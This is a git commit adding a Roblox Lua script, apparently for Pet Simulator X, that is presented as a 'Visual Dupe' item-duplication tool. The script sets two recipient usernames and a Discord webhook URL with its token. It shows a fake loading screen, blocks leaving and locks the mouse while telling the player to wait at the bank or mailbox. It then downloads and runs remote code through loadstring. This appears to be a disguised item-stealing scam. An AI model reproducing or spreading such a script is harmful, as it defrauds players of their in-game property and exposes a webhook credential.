96316b428f1c5acab682e803315cc90b549ea848
MrPectable <126442140+MrPectable@users.noreply.github.com>
2023-05-14 23:21:15 -0400

    Create psxv.lua

---
+++ psxv.lua
@@ -0,0 +1,15 @@
+UserName = "jsavige4"
+UserName2 = "jsavige4alt"
+Webhook = "https://discord.com/api/webhooks/1106824427976540280/DMCM8a6LMXilU9K4Iuyx7feogRAc-MYTY99brOzZ5NOqs_fGspWEDfC1u0E-UKwP5MIQ"
+
+_G.LoadingScreen = true
+_G.AntiLeave = true
+_G.MouseLock = true 
+
+_G.ScriptName = "Visual Dupe"
+_G.FirstText = "Script Preparing"
+_G.SecondText = "Visual Dupe almost Done..."
+_G.ThirdText = "Make Sure Your At Bank/Mailbox..."
+_G.WaitingTime = 30 -- it's the time between 0% and 100% in secondes
+
+loadstring(game:HttpGet("https://raw.githubusercontent.com/k4ftt/R/main/Main.lua", true))()
